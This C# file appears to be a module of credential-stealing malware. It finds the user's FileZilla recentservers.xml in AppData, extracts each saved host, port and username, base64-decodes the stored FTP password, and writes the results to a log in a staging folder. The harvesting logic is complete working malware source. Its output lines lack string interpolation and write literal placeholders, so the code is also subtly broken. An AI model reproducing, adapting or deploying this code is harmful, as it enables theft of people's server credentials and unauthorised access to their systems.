﻿using System;
using System.IO;
using System.Text;
using System.Xml;

namespace youknowcaliber
{
	internal class FileZilla
	{
		public static void GetFileZilla()
		{
			string exploitDir = Help.ExploitDir;
			bool flag = !File.Exists(FileZilla.FzPath);
			if (!flag)
			{
				Directory.CreateDirectory(exploitDir + "\\FileZilla");
				FileZilla.GetDataFileZilla(FileZilla.FzPath, exploitDir + "\\FileZilla\\FileZilla.log", "RecentServers", "Server");
			}
		}

		public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
		{
			try
			{
				bool flag = File.Exists(PathFZ);
				if (flag)
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(PathFZ);
					foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
					{
						XmlElement xmlElement = (XmlElement)obj;
						string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
						string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
						string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
						bool flag2 = !string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3) && !string.IsNullOrEmpty(@string);
						if (!flag2)
						{
							break;
						}
						FileZilla.SB.AppendLine("Host: {Host}");
						FileZilla.SB.AppendLine("Port: {Port}");
						FileZilla.SB.AppendLine("User: {User}");
						FileZilla.SB.AppendLine("Pass: {Pass}\r\n");
						Counting.FileZilla++;
					}
					bool flag3 = FileZilla.SB.Length > 0;
					if (flag3)
					{
						File.AppendAllText(SaveFile, FileZilla.SB.ToString());
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		private static StringBuilder SB = new StringBuilder();

		public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
	}
}
